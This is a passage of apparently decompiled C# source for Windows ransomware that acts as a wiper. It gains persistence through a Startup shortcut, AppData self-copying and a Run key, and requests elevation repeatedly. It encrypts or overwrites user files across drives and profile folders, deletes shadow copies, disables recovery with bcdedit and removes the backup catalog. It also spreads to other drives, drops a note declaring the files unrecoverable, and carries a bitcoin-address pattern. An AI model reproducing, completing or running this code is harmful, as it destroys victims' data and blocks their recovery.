suraXGdByqgyJ7DQao2QmpxUl0YPQHNioA7TUAyRIogZKmiIwtu1cIJDayBvISTGk66aaGaIrDzg7qUqUsJSE6GVAmYBAhM6kEeYoWhWye2sW8gWp0ax1RvEqAOY8Orm4f1Nithtuu0TllClkelvhWihGpEalJmPo9tHkqdh9pjSEQGrdAIzAKVqqFGTMACQAADv386ZIpnB1ywz+1n1GS4R2DQbgNB4CrEkZZJETilrkqUTJkyZk8++jQE0mHYWxAjXsnh3UyRRmnbGnRRUM9gfztKHOs3n00E8aDL1jco8OizouTIASAMk927Sl2mRnLZcVk36pM8NdP61OEQLw+2I1PKlkwxQ1wW2ShrTjJ8TVGWVyOhporY2R4ysJYVm5Eee6jjVyEzcY6YiceUhgFJ1hPwrRVyMK6lRxPEXiYLh7gYpuhtxY49aCNj/wBYrsj30Owuq6IvbrmkVSkZpTtUV5y0Uq4QRw1Ptq++AJ+y0WUwBqao5G4S5BnkJI3CnTZW67HmG2GIJaey5Sf/AEPxppSo6miwPJG7PNKzHoTVREMohJbZhTighIlSjAG6glYspKKt9Cz2vyfXShKlNJHeVHyj40+wwS8SxLomxxZfJeSJW/p9VIHvmpsRTLxN/wAsR9Y/J9ZBZSsFXKSffRpJdDM9dmfcbf3aw61Gcsokbjlk+dBX2Flmyz4cmwOx2htXFFq2aClgkq6uUADeSTE7uFMue4J4Zxjcx2HHlpPRpQk9v9KnC6lKIFWt2iVPXIyaAJbRlUCogSVEmfIUFTZZJxUeF+p4ntNb5Lt9GYrhZ6yt5zAK1848Krl1O9p5bsUXVcHFpgj7hhKOAIlSRMkJHHmaii2GWeEerHrewF1lSpSm0ZuBJMaFW9IPAGjRV9qjfCJ0bHNoVkefOY5CMqYBCiscZ4pHnUIs7b4QNcWdulwMstuOOJKSsqUmJIKQEnQRncb4CYExrILE21bDHkPpLQDSEHPkTnIUFKK5zKCZglQ1M+e+hwSyRFyGlLD7yiCAEpSmM3UIKs0SCFJSnhrruANCr6CsFaxFlOeULdKlZgVqPcJknMQkkAkbzT0xGY/iWdBQG20AxOURJlJKjGkkpHmeyGSFB0CmFYfZN8aaKM+WXYatIqwySYUlNErGeGioUZBw2yDUsos0mxbzSoadlDnsMsj6DYKSCIT9HeeXKq6YjaOEvqOXhKSfdR2hsKsEneeVJMfH1CbRwJQkTx+NJJWy7Hk2xSBdp1hTXcQabAqYdRkTqhTiYi0nsR7xVi94ojG5IowSXVkA5QPOm6nQ4xxvuPcFZSwSoSZGs0dpkzZHkCFbVBTobSNfGlSV0D7NLZvYwsrklwnsFM1xRnapDgslcSSBpu0qq0gqLkafaCU+NSLtkcaR5bt42Oknt/lpp9DqeHN0f//Z";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[5] { "YOU HAVE BEEN HACKED! ALL YOUR FILES ARE NOW ENCRYPTED WITH RANSOMWARE! ", "", "THERE IS NO RANSOM. YOU ARE NOT GETTING YOUR FILES BACK.", "", "BE CAREFUL WHO YOU TRY TO SCAM :-)" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>y2sIbJkC5BHs8N2ar0i9amfTXg+DdFDJFDMC7g5Xr/TOONYhaNykNlgO7mPv+UzGluvoZgR5IRVKXSr099bslkwPfsJ30N8cYCYScLejANqYnIxwkch8LV6lnq6ki7f7Ejdz3uEee3XWqeXCPjyXHQmtTj8XRtRnIwZ7R5me3xk=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
